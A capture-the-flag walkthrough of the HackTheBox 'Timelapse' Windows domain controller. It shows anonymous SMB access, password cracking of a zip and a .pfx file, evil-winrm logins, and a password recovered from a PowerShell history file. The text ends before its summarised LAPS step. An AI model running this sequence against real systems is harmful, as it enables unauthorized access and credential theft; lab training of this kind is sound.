---
Category:
  - B2R
Difficulty: Easy
Platform: HackTheBox
Status: 3. Complete
tags: [.pfx-files, LAPS, Windows, cracking-pfx-files, cracking-zip-files, credentials-in-LAPS, credentials-in-history, weak-credentials, anonymous-smb]
---
![Timelapse.png](../../zzz_res/attachments/Timelapse.png)

# Resolution summary

>[!summary]
>- Accessing a **public SMB** share through a **null session** it was possible to discover a **crypted zip containing a .pfx file**
>- **Cracking the .pfx** file it was possible to obtain **Legacyy’s private key and certificate**, providing a low privilege access to the box using winrm
>- Local enumeration allowed to discover svc_deploy’s credentials inside the **powershell history** file
>- svc_deploy was able to access **credentials contained inside LAPS** (Local Administrator Password Solution), discovering the Administrator password

## Improved skills

- Manage and decrypt .pfx files
- Enumerating LAPS (Local Administrator Password Solution)

## Used tools

- nmap
- smbmap
- zip2john
- pfx2john
- john
- openssl
- evil-winrm

---

# Information Gathering

Scanned all TCP ports:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/B2R/Timelaps]
└─$ sudo nmap -sS -p- 10.10.11.152 -v -oN scan/all-tcp-ports.txt
...
Not shown: 65520 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
5986/tcp  open  wsmans
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49696/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 156.31 seconds
           Raw packets sent: 196694 (8.655MB) | Rcvd: 131 (5.748KB)
```

Enumerated open TCP ports:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/B2R/Timelaps]
└─$ cat scan/all-tcp-ports.txt | grep open | cut -d '/' -f1 | sed ':a;N;$!ba;s/\n/,/g'
53,88,135,139,389,445,464,593,636,5986,9389,49667,49673,49674,49696

┌──(kali㉿kali)-[~/CTFs/HTB/B2R/Timelaps]
└─$ sudo nmap -sT -sV -sC -p53,88,135,139,389,445,464,593,636,5986,9389,49667,49673,49674,49696 10.10.11.152 -oN scan/open-tcp-ports.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-08 15:45 EDT
Nmap scan report for 10.10.11.152
Host is up (0.064s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-05-09 03:45:56Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_ssl-date: 2022-05-09T03:47:26+00:00; +7h59m59s from scanner time.
|_http-title: Not Found
| tls-alpn:
|_  http/1.1
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2022-05-09T03:46:50
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m58s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.11 seconds
```

# Enumeration

## Port 139 & Port 445 - NetBios & SMB

Enumerated anonymous shares:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/B2R/Timelaps]
└─$ smbmap -H 10.10.11.152 -u ' '
[+] Guest session       IP: 10.10.11.152:445    Name: dc01.timelapse.htb
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share
        Shares                                                  READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share
```

Enumerated **Shares** shared folder:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/B2R/Timelaps]
└─$ smbmap -H 10.10.11.152 -u ' ' -R Shares
[+] Guest session       IP: 10.10.11.152:445    Name: dc01.timelapse.htb
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Shares                                                  READ ONLY
        .\Shares\*
        dr--r--r--                0 Mon Oct 25 11:55:14 2021    .
        dr--r--r--                0 Mon Oct 25 11:55:14 2021    ..
        dr--r--r--                0 Mon Oct 25 15:40:06 2021    Dev
        dr--r--r--                0 Mon Oct 25 11:55:14 2021    HelpDesk
        .\Shares\Dev\*
        dr--r--r--                0 Mon Oct 25 15:40:06 2021    .
        dr--r--r--                0 Mon Oct 25 15:40:06 2021    ..
        fr--r--r--             2611 Mon Oct 25 17:05:30 2021    winrm_backup.zip
        .\Shares\HelpDesk\*
        dr--r--r--                0 Mon Oct 25 11:55:14 2021    .
        dr--r--r--                0 Mon Oct 25 11:55:14 2021    ..
        fr--r--r--          1118208 Mon Oct 25 11:55:14 2021    LAPS.x64.msi
        fr--r--r--           104422 Mon Oct 25 11:55:14 2021    LAPS_Datasheet.docx
        fr--r--r--           641378 Mon Oct 25 11:55:14 2021    LAPS_OperationsGuide.docx
        fr--r--r--            72683 Mon Oct 25 11:55:14 2021    LAPS_TechnicalSpecification.docx
```

Downloaded all files:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/B2R/Timelaps]
└─$ sudo smbmap -R Shares -H dc01.timelapse.htb -A . -u ' '
[+] Guest session       IP: dc01.timelapse.htb:445      Name: unknown
[+] Starting search for files matching '.' on share Shares.
[+] Match found! Downloading: Shares\Dev\winrm_backup.zip
[+] Match found! Downloading: Shares\HelpDesk\LAPS.x64.msi
[+] Match found! Downloading: Shares\HelpDesk\LAPS_Datasheet.docx
[+] Match found! Downloading: Shares\HelpDesk\LAPS_OperationsGuide.docx
[+] Match found! Downloading: Shares\HelpDesk\LAPS_TechnicalSpecification.docx

┌──(kali㉿kali)-[~/…/HTB/B2R/Timelaps/loot]
└─$ ls -al
total 1916
drwxr-xr-x 2 kali kali    4096 May  8 16:17 .
drwxr-xr-x 5 kali kali    4096 May  8 16:02 ..
-rw-r--r-- 1 root root    2611 May  8 16:03 dc01.timelapse.htb-Shares_Dev_winrm_backup.zip
-rw-r--r-- 1 root root  104422 May  8 16:03 dc01.timelapse.htb-Shares_HelpDesk_LAPS_Datasheet.docx
-rw-r--r-- 1 root root  641378 May  8 16:03 dc01.timelapse.htb-Shares_HelpDesk_LAPS_OperationsGuide.docx
-rw-r--r-- 1 root root   72683 May  8 16:03 dc01.timelapse.htb-Shares_HelpDesk_LAPS_TechnicalSpecification.docx
-rw-r--r-- 1 root root 1118208 May  8 16:03 dc01.timelapse.htb-Shares_HelpDesk_LAPS.x64.msi
```

Cracked the password protected zip file:

```bash
┌──(kali㉿kali)-[~/…/HTB/B2R/Timelaps/loot]
└─$ zip2john dc01.timelapse.htb-Shares_Dev_winrm_backup.zip > zip.hash

┌──(kali㉿kali)-[~/…/HTB/B2R/Timelaps/loot]
└─$ john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt --fork=5
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Node numbers 1-5 of 5 (fork)
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (dc01.timelapse.htb-Shares_Dev_winrm_backup.zip/legacyy_dev_auth.pfx)
5 1g 0:00:00:00 DONE (2022-05-08 16:19) 8.333g/s 5781Kp/s 5781Kc/s 5781KC/s supsid..supravit
4 0g 0:00:00:00 DONE (2022-05-08 16:19) 0g/s 6236Kp/s 6236Kc/s 6236KC/s    1990   .ie168
2 0g 0:00:00:00 DONE (2022-05-08 16:19) 0g/s 6103Kp/s 6103Kc/s 6103KC/s  _ 09..*7¡Vamos!
3 0g 0:00:00:00 DONE (2022-05-08 16:19) 0g/s 5976Kp/s 5976Kc/s 5976KC/s  08 22 0128..xCvBnM,
1 0g 0:00:00:00 DONE (2022-05-08 16:19) 0g/s 5854Kp/s 5854Kc/s 5854KC/s  green1day.a6_123
Waiting for 4 children to terminate
Session completed.

┌──(kali㉿kali)-[~/…/HTB/B2R/Timelaps/loot]
└─$ unzip dc01.timelapse.htb-Shares_Dev_winrm_backup.zip
Archive:  dc01.timelapse.htb-Shares_Dev_winrm_backup.zip
[dc01.timelapse.htb-Shares_Dev_winrm_backup.zip] legacyy_dev_auth.pfx password:
  inflating: legacyy_dev_auth.pfx

┌──(kali㉿kali)-[~/…/HTB/B2R/Timelaps/loot]
└─$ file legacyy_dev_auth.pfx
legacyy_dev_auth.pfx: data
```

>[!info]
>The .pfx file, which is in a PKCS#12 format, contains the SSL certificate (public keys) and the corresponding private keys. Sometimes, you might have to import the certificate and private keys separately in an unencrypted plain text format to use it on another system. This topic provides instructions on how to convert the .pfx file to .crt and .key files.

### Extract .crt and .key files from .pfx file:

[Extracting the certificate and keys from a .pfx file](https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file)

Cracking **.pfx** to get encryption password:

```bash
┌──(kali㉿kali)-[~/…/HTB/B2R/Timelaps/loot]
└─$ pfx2john legacyy_dev_auth.pfx > pfx.hash

┌──(kali㉿kali)-[~/…/HTB/B2R/Timelaps/loot]
└─$ john pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt --fork=5
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 AVX 4x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Node numbers 1-5 of 5 (fork)
Press 'q' or Ctrl-C to abort, almost any other key for status
1 0g 0:00:01:32 17.66% (ETA: 16:41:22) 0g/s 5981p/s 5981c/s 5981C/s wilderalberto..wildeana
3 0g 0:00:01:32 19.39% (ETA: 16:40:36) 0g/s 6508p/s 6508c/s 6508C/s ujusthatin..ujpest14
2 0g 0:00:01:32 20.52% (ETA: 16:40:10) 0g/s 6854p/s 6854c/s 6854C/s todopeluche..todolopuedo25
4 0g 0:00:01:32 20.48% (ETA: 16:40:11) 0g/s 6842p/s 6842c/s 6842C/s toldme17..tolbert85
5 0g 0:00:01:31 20.59% (ETA: 16:40:05) 0g/s 6877p/s 6877c/s 6877C/s tmnme575..tmn388
thuglegacy       (legacyy_dev_auth.pfx)
5 1g 0:00:01:34 DONE (2022-05-08 16:34) 0.01061g/s 6857p/s 6857c/s 6857C/s thuglif33..thuging1
```

Extract .key:

```bash
┌──(kali㉿kali)-[~/…/HTB/B2R/Timelaps/loot]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv.key
Enter Import Password: thuglegacy
Enter PEM pass phrase: password
Verifying - Enter PEM pass phrase: password

┌──(kali㉿kali)-[~/…/HTB/B2R/Timelaps/loot]
└─$ ls -al priv.key
-rw------- 1 kali kali 2102 May  8 16:37 priv.key

┌──(kali㉿kali)-[~/…/HTB/B2R/Timelaps/loot]
└─$ cat priv.key
Bag Attributes
    Microsoft Local Key set: <No Values>
    localKeyID: 01 00 00 00
    friendlyName: te-4a534157-c8f1-4724-8db6-ed12f25c2a9b
    Microsoft CSP Name: Microsoft Software Key Storage Provider
Key Attributes
    X509v3 Key Usage: 90
-----BEGIN ENCRYPTED PRIVATE KEY-----
MIIFHDBOBgkqhkiG9w0BBQ0wQTApBgkqhkiG9w0BBQwwHAQIdsBhE6kdp/cCAggA
MAwGCCqGSIb3DQIJBQAwFAYIKoZIhvcNAwcECPN/YhO6zuZ0BIIEyMkQ7It0Ujld
0ary1CtsyQFQYBX1ZJPKn043oUyLj98Ln5IffVB5NqO9ftW6vjf/BVoxLnTv4bxO
KxA2S4eKtqTW3vf0S6ISmPzTxcNzteA3LudzyXCUYBBDA/c4pfnBwKXkiKa0ALGI
4fTlMLaAA7chhkfiLPwXG974npMGgVZGpYH9M3+40kCTodWjumBWaOBPdl8nBaSp
Sdil2UkxfLkd6V9Mmpm2327hzinAelMhlmFkpt0UL54/Jh7G1+x+EtsfQsIX3FP+
bia4RoLVpqfMaTBqr6WvwVHFOwBD122Mrs6ZBZ/PelxOZwREU5DTCJ1tLzLKYfsh
DkrGtgeNKuqJEe6Yh9u4VH8BlRPqUTCotuOORb6BpcTARNcRxpbMIDr1oa2afN2e
ElCzNKeBqmNabdFY+KjHPbz6JKGFSHVs1i7buHecWPrsiDmpwc8XNNURvg1m3d+x
J08DHuzEKihM3zEOdBqprZ20bQzEkBeUPraDwzIiIeu8VbApkXwkth2m81DjiCIk
r04R4dgNoyBzXXDBpIsd4dDLJEue4r/flNe3r0ruf43vhcdtN9euq6n92NxeodJw
BXe1MHtBbye3yOALRVnnin4BZ+vBb1dNrbFZZCNJR3N8FHhOnnbhChKbkGrcxgXw
oUKXPBpctCRm4UdL06fbPlghuFA/67B/NqzLOIkdYDhJpyhjHc0lIXwwyStxCAHd
HEu9RKhLy5Ao6CraNwarND+SFYiXT6l/s+9P9lgtNlGIlXuveZZwlI/mDIfzWyla
79j2qqJWdIdA21JWEQ0KxC6x+fsRa0CARvnlhI7JZGSKh7kfBFFzoU0AxwbnCWsF
TwVXPYrvGa3AKDUcDwwCR+AcW6Q0i/umqJ8zNYPASbIpmGmCXitl5cC3Tp4KkTnR
9KvEg+wcTX8hCk0vzituzWrDe7IYY9K3Qrsn21NP2pauQurLwdIw5ByIRry1iwps
EPKS+Au8aEaAQrzR5sz4P8tcMrRSkc/P8Ig843qwQMfgdgt+k9K5f7+xOdgJdqGv
y5eVwKyCodtiI/XbGtJOquZHZDacWbEMyBCZeRJMVe59M6HogNrWoetEbojtVqBX
kgRdHVVoN3F4c5knjGvVoek7wfptRWOcgrVAIEDjupQbfiqpMht76OdnwsRiEOSO
YUX/l/Pa+I609YvF/C86/nsTC7iaj/9lCKbJogNtmq5gboBF0PUk/OzY8yZLGrUj
Cj9d6XaVGYRjNJq3QVvqh/iYfa9ayFx+1yWBwiFANfmYPiILwREYJkM6Ro0AS1sQ
l6wczK4Bz6UKW1HHin0pua8KtcYTQcuHlvsgIf7VHv2H5TbROs5he4FDXRA3KtoQ
IiVDGcA/7I3kqxa1XMdLplxjYEp4pfbWk57NNA3fmbTpRgkDVE+tn8vKj3T0WKRa
HDn2PFBUlIqnTNkkegGEc9knBjS3VEGcYIjtU78ppAR/ODABOEqcHl7/KJ63jHaq
a1/F92XJYNZncu+OEKhKlk/gdCEQqJqp642rGINSSM+Or1ccsCpgkWl80kWZTrsh
fF5tPBzHuEyjKChVjtjJDeorQpZtQ7BoL2G7ip4IzgYYYdwcaXbAYpQbyiaE6qGn
HsM6IzAtcW0p9kjo2um+Vg==
-----END ENCRYPTED PRIVATE KEY-----
```

Extract .crt:

```bash
┌──(kali㉿kali)-[~/…/HTB/B2R/Timelaps/loot]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt
Enter Import Password: thuglegacy

┌──(kali㉿kali)-[~/…/HTB/B2R/Timelaps/loot]
└─$ ls -al cert.crt
-rw------- 1 kali kali 1238 May  8 16:39 cert.crt

┌──(kali㉿kali)-[~/…/HTB/B2R/Timelaps/loot]
└─$ cat cert.crt
Bag Attributes
    localKeyID: 01 00 00 00
subject=CN = Legacyy

issuer=CN = Legacyy

-----BEGIN CERTIFICATE-----
MIIDJjCCAg6gAwIBAgIQHZmJKYrPEbtBk6HP9E4S3zANBgkqhkiG9w0BAQsFADAS
MRAwDgYDVQQDDAdMZWdhY3l5MB4XDTIxMTAyNTE0MDU1MloXDTMxMTAyNTE0MTU1
MlowEjEQMA4GA1UEAwwHTGVnYWN5eTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
AQoCggEBAKVWB6NiFkce4vNNI61hcc6LnrNKhyv2ibznhgO7/qocFrg1/zEU/og0
0E2Vha8DEK8ozxpCwem/e2inClD5htFkO7U3HKG9801NFeN0VBX2ciIqSjA63qAb
YX707mBUXg8Ccc+b5hg/CxuhGRhXxA6nMiLo0xmAMImuAhJZmZQepOHJsVb/s86Z
7WCzq2I3VcWg+7XM05hogvd21lprNdwvDoilMlE8kBYa22rIWiaZismoLMJJpa72
MbSnWEoruaTrC8FJHxB8dbapf341ssp6AK37+MBrq7ZX2W74rcwLY1pLM6giLkcs
yOeu6NGgLHe/plcvQo8IXMMwSosUkfECAwEAAaN4MHYwDgYDVR0PAQH/BAQDAgWg
MBMGA1UdJQQMMAoGCCsGAQUFBwMCMDAGA1UdEQQpMCegJQYKKwYBBAGCNxQCA6AX
DBVsZWdhY3l5QHRpbWVsYXBzZS5odGIwHQYDVR0OBBYEFMzZDuSvIJ6wdSv9gZYe
rC2xJVgZMA0GCSqGSIb3DQEBCwUAA4IBAQBfjvt2v94+/pb92nLIS4rna7CIKrqa
m966H8kF6t7pHZPlEDZMr17u50kvTN1D4PtlCud9SaPsokSbKNoFgX1KNX5m72F0
3KCLImh1z4ltxsc6JgOgncCqdFfX3t0Ey3R7KGx6reLtvU4FZ+nhvlXTeJ/PAXc/
fwa2rfiPsfV51WTOYEzcgpngdHJtBqmuNw3tnEKmgMqp65KYzpKTvvM1JjhI5txG
hqbdWbn2lS4wjGy3YGRZw6oM667GF13Vq2X3WHZK5NaP+5Kawd/J+Ms6riY0PDbh
nx143vIioHYMiGCnKsHdWiMrG2UWLOoeUrlUmpr069kY/nn7+zSEa2pA
```

Decrypt private key:

```bash
┌──(kali㉿kali)-[~/…/HTB/B2R/Timelaps/loot]
└─$ openssl rsa -in priv.key -out decrypted-priv.key
Enter pass phrase for priv.key: password
writing RSA key

┌──(kali㉿kali)-[~/…/HTB/B2R/Timelaps/loot]
└─$ ls -al decrypted-priv.key
-rw------- 1 kali kali 1675 May  8 16:40 decrypted-priv.key
```

## Port 389 & Port 636 - LDAP

Enumerated LDAP using NSE:

```bash
┌──(kali㉿kali)-[~/…/HTB/B2R/Timelaps/loot]
└─$ sudo nmap -n -sV --script "ldap* and not brute" 10.10.11.152 -sT
...
389/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb, Site: Default-First-Site-Name)
| ldap-rootdse:
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=timelapse,DC=htb
|       ldapServiceName: timelapse.htb:dc01$@TIMELAPSE.HTB
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedControl: 1.2.840.113556.1.4.2090
|       supportedControl: 1.2.840.113556.1.4.2205
|       supportedControl: 1.2.840.113556.1.4.2204
|       supportedControl: 1.2.840.113556.1.4.2206
|       supportedControl: 1.2.840.113556.1.4.2211
|       supportedControl: 1.2.840.113556.1.4.2239
|       supportedControl: 1.2.840.113556.1.4.2255
|       supportedControl: 1.2.840.113556.1.4.2256
|       supportedControl: 1.2.840.113556.1.4.2309
|       supportedControl: 1.2.840.113556.1.4.2330
|       supportedControl: 1.2.840.113556.1.4.2354
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=timelapse,DC=htb
|       serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=timelapse,DC=htb
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=timelapse,DC=htb
|       namingContexts: DC=timelapse,DC=htb
|       namingContexts: CN=Configuration,DC=timelapse,DC=htb
|       namingContexts: CN=Schema,CN=Configuration,DC=timelapse,DC=htb
|       namingContexts: DC=DomainDnsZones,DC=timelapse,DC=htb
|       namingContexts: DC=ForestDnsZones,DC=timelapse,DC=htb
|       isSynchronized: TRUE
|       highestCommittedUSN: 131175
|       dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=timelapse,DC=htb
|       dnsHostName: dc01.timelapse.htb
|       defaultNamingContext: DC=timelapse,DC=htb
|       currentTime: 20220509042654.0Z
|_      configurationNamingContext: CN=Configuration,DC=timelapse,DC=htb
```

## Port 88 - Kerberos

User enumeration:

```bash
┌──(kali㉿kali)-[~/…/HTB/B2R/Timelaps/loot]
└─$ sudo nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=timelapse.htb, 10.10.11.152 -sT
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-08 17:04 EDT
Nmap scan report for dc01.timelapse.htb (10.10.11.152)
Host is up (0.037s latency).

PORT   STATE SERVICE
88/tcp open  kerberos-sec
| krb5-enum-users:
| Discovered Kerberos principals
|     guest@timelapse.htb
|_    administrator@timelapse.htb

Nmap done: 1 IP address (1 host up) scanned in 0.51 seconds
```

# Exploitation

## Login using leaked keys

```bash
┌──(kali㉿kali)-[~/…/HTB/B2R/Timelaps/loot]
└─$ evil-winrm -c cert.crt -k priv.key -i 10.10.11.152 -u -p password -S

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

Enter PEM pass phrase:
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami; hostname
Enter PEM pass phrase:
timelapse\legacyy
dc01
...
*Evil-WinRM* PS C:\Users\legacyy\Desktop> dir

    Directory: C:\Users\legacyy\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         5/8/2022   8:36 PM             34 user.txt

*Evil-WinRM* PS C:\Users\legacyy\Desktop> cat user.txt
64233e623cda535f5a5054258fe2f9dd
```

# Privilege Escalation

## Local enumeration as legacyy

Enumerated local user and privileges:

```bash
*Evil-WinRM* PS C:\Users\legacyy\Desktop> whoami /priv
Enter PEM pass phrase:

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\legacyy\Desktop> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            babywyrm                 Guest
krbtgt                   legacyy                  payl0ad
sinfulz                  svc_deploy               thecybergeek
TRX
The command completed with one or more errors.
```

Enumerated Powershell history:

```bash
*Evil-WinRM* PS C:\Users\legacyy\Documents> type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Enter PEM pass phrase:
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

## Login as svc_deploy using leaked credentials

```bash
┌──(kali㉿kali)-[~/…/HTB/B2R/Timelaps/loot]
└─$ evil-winrm -u 'timelapse.htb\svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -i 10.10.11.152 -S

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami
timelapse\svc_deploy
```

## Local enumeration as svc_deploy:

```bash
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami
timelapse\svc_deploy
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

*Evil-WinRM* PS C:\Users> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            babywyrm                 Guest
krbtgt                   legacyy                  payl0ad
sinfulz                  svc_deploy               thecybergeek
TRX
The command completed with one or more errors.

*Evil-WinRM* PS C:\Program Files\LAPS\CSE> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
TIMELAPSE\LAPS_Readers                      Group            S-1-5-21-671920749-559770252-3318990721-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448

*Evil-WinRM* PS C:\Users\svc_deploy> Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime

Parent              Name                                        LastWriteTime
------              ----                                        -------------
Program Files       Common Files                                10/23/2021 11:28:43 AM
Program Files       internet explorer                           3/3/2022 10:01:29 PM
Program Files       LAPS                                        10/25/2021 9:01:12 AM
Program Files       VMware                                      3/3/2022 10:10:19 PM
Program Files       Windows Defender                            3/3/2022 10:01:29 PM
Program Files       Windows Defender Advanced Threat Protection 3/21/2022 8:45:03 PM
